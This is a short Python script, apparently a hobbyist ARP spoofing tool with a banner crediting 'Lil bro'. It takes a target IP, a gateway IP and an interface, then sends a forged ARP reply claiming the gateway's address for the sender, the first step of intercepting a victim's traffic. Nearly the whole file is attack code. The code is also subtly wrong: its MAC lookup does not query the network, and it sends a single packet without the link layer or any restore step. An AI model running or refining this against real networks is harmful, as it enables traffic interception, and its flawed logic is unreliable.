from scapy.all import ARP, Ether, sendp
import argparse
from colorama import Fore, Back, Style

print(Fore.RED + """
  ______   _______   _______                                          
 /      \ /       \ /       \                                         
/$$$$$$  |$$$$$$$  |$$$$$$$  |                                        
$$ |__$$ |$$ |__$$ |$$ |__$$ |                                        
$$    $$ |$$    $$< $$    $$/                                         
$$$$$$$$ |$$$$$$$  |$$$$$$$/                                          
$$ |  $$ |$$ |  $$ |$$ |                                              
$$ |  $$ |$$ |  $$ |$$ |                                              
$$/   $$/ $$/   $$/ $$/                                               
                                                                      
            By Lil bro   💀                                                       
                                                                      
  ______   _______    ______   ________  ________  ________  _______  
 /      \ /       \  /      \ /        |/        |/        |/       \ 
/$$$$$$  |$$$$$$$  |/$$$$$$  |$$$$$$$$/ $$$$$$$$/ $$$$$$$$/ $$$$$$$  |
$$ \__$$/ $$ |__$$ |$$ |  $$ |$$ |__    $$ |__    $$ |__    $$ |__$$ |
$$      \ $$    $$/ $$ |  $$ |$$    |   $$    |   $$    |   $$    $$< 
 $$$$$$  |$$$$$$$/  $$ |  $$ |$$$$$/    $$$$$/    $$$$$/    $$$$$$$  |
/  \__$$ |$$ |      $$ \__$$ |$$ |      $$ |      $$ |_____ $$ |  $$ |
$$    $$/ $$ |      $$    $$/ $$ |      $$ |      $$       |$$ |  $$ |
 $$$$$$/  $$/        $$$$$$/  $$/       $$/       $$$$$$$$/ $$/   $$/ 
"""

)






def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target_ip", dest="target_ip", help="Target IP address")
    parser.add_argument("-g", "--gateway_ip", dest="gateway_ip", help="Gateway IP address")
    parser.add_argument("-i", "--interface", dest="interface", help="Network interface")
    options = parser.parse_args()
    return options

def arp_spoofer(target_ip, gateway_ip, interface):
    target_mac = ARP(pdst=target_ip).hwsrc
    gateway_mac = ARP(pdst=gateway_ip).hwsrc
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    sendp(packet, iface=interface, verbose=False)

options = get_arguments()
arp_spoofer(options.target_ip, options.gateway_ip, options.interface)